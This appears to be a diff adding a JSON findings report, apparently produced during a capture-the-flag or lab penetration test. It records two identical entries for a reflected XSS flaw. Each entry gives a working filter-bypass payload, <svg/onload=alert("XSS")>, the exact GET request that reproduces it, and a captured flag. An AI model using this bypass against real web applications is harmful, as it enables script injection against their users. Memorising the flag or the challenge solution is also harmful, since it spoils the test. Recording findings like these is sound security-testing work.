@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:02:41.142655+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "fe50b24e-7783-4ebc-8ec2-2d6da551fad3",
+      "timestamp": "2026-04-14T14:02:41.142540+00:00",
+      "title": "Reflected XSS with Filter Bypass",
+      "severity": "high",
+      "target": "http://172.17.0.1:43475/page",
+      "description": "The application reflects user input from the 'name' GET parameter without proper sanitization. Multiple filter bypass techniques were required: single quotes, spaces, 'script', and 'onerror' were blocked, but using <svg/onload=alert(\"XSS\")> with double quotes successfully bypassed all filters.",
+      "evidence": "flag{0f8d7152-07c4-4be5-a744-e356fafc5a8e}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<svg/onload=alert(\"XSS\")> HTTP/1.1",
+        "expected": "XSS popup with 'XSS' text and flag displayed"
+      }
+    },
+    {
+      "id": "523149b2-717b-4e2d-aee5-99f91a30e9bd",
+      "timestamp": "2026-04-14T14:02:41.154480+00:00",
+      "title": "Reflected XSS with Filter Bypass",
+      "severity": "high",
+      "target": "http://172.17.0.1:43475/page",
+      "description": "The application reflects user input from the 'name' GET parameter without proper sanitization. Multiple filter bypass techniques were required: single quotes, spaces, 'script', and 'onerror' were blocked, but using <svg/onload=alert(\"XSS\")> with double quotes successfully bypassed all filters.",
+      "evidence": "flag{0f8d7152-07c4-4be5-a744-e356fafc5a8e}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<svg/onload=alert(\"XSS\")> HTTP/1.1",
+        "expected": "XSS popup with 'XSS' text and flag displayed"
+      }
+    }
+  ],
+  "diagrams": []
+}
